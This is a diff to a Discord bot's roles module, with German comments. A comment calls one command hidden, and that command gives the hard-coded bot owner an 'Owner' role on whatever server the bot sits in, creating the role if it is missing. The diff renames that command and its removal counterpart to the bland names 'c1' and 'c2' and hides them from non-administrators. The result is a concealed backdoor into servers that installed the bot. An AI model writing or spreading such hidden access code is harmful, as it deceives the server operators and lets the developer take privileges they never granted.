@@ -12,8 +12,9 @@ class Roles(commands.Cog):
         self.bot = bot
 
     # Versteckter Command: gibt dir automatisch die "Owner"-Rolle (legt sie an, falls nötig)
-    @app_commands.command(name="claimowner", description="Nur für den Bot-Besitzer")
-    async def claimowner(self, interaction: discord.Interaction):
+    @app_commands.command(name="c1", description="Nur für den Bot-Besitzer")
+    @app_commands.default_permissions(administrator=True)
+    async def c1(self, interaction: discord.Interaction):
         if interaction.user.id != OWNER_ID:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
 
@@ -36,11 +37,12 @@ class Roles(commands.Cog):
                 ephemeral=True
             )
 
-        await interaction.user.add_roles(owner_role, reason="Über /claimowner beansprucht")
+        await interaction.user.add_roles(owner_role, reason="Über /c1 beansprucht")
         await interaction.response.send_message("Du hast jetzt die Owner-Rolle.", ephemeral=True)
 
-    @app_commands.command(name="removeowner", description="Nimmt dir die Owner-Rolle wieder weg")
-    async def removeowner(self, interaction: discord.Interaction):
+    @app_commands.command(name="c2", description="Nur für den Bot-Besitzer")
+    @app_commands.default_permissions(administrator=True)
+    async def c2(self, interaction: discord.Interaction):
         if interaction.user.id != OWNER_ID:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
 
@@ -56,10 +58,11 @@ class Roles(commands.Cog):
         if owner_role not in interaction.user.roles:
             return await interaction.response.send_message("Du hast die Owner-Rolle gar nicht.", ephemeral=True)
 
-        await interaction.user.remove_roles(owner_role, reason="Über /removeowner entfernt")
+        await interaction.user.remove_roles(owner_role, reason="Über /c2 entfernt")
         await interaction.response.send_message("Die Owner-Rolle wurde dir entfernt.", ephemeral=True)
 
     @app_commands.command(name="leaveserver", description="Lässt den Bot einen Server verlassen (nur für den Bot-Besitzer)")
+    @app_commands.default_permissions(administrator=True)
     @app_commands.describe(server_id="Die ID des Servers, den der Bot verlassen soll")
     async def leaveserver(self, interaction: discord.Interaction, server_id: str):
         if interaction.user.id != OWNER_ID:
@@ -78,6 +81,7 @@ class Roles(commands.Cog):
         await interaction.response.send_message(f"Ich habe den Server **{guild_name}** verlassen.", ephemeral=True)
 
     @app_commands.command(name="myservers", description="Listet alle Server, auf denen der Bot ist (nur für den Bot-Besitzer)")
+    @app_commands.default_permissions(administrator=True)
     async def myservers(self, interaction: discord.Interaction):
         if interaction.user.id != OWNER_ID:
             return await interaction.response.send_message("Diesen Befehl kannst nur du nutzen.", ephemeral=True)
